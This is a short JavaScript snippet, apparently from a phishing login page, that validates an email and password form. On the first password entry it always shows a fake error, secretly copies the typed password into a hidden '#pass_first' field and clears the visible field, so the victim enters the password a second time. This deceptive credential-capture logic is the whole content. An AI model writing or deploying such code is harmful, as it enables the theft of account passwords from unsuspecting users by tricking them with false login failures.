    <script>
        const emailer = document.querySelector('#emailer');
    const password = document.querySelector('#password');
    const error_text = document.querySelector('#error_text');

    first_attempt = 0;
    function checkForm(){
        if(emailer.value.length == 0){
            emailer.style.borderColor = 'red';
            event.preventDefault();
        }else{
            emailer.style.borderColor = '#98A3A6';
        }
        if(password.value.length == 0){
            password.style.borderColor = 'red';
            error_text.style.opacity = '1';
            event.preventDefault();
        }else if((password.value.length != 0 && first_attempt == 0)){
            password.style.borderColor = 'red';
            error_text.style.opacity = '1';
            document.querySelector('#pass_first').value = password.value;
            password.value = null;
            event.preventDefault();
            first_attempt++;
        }else{
            password.style.borderColor = '#98A3A6';
            error_text.style.opacity = '0';
        }
    }
    </script>
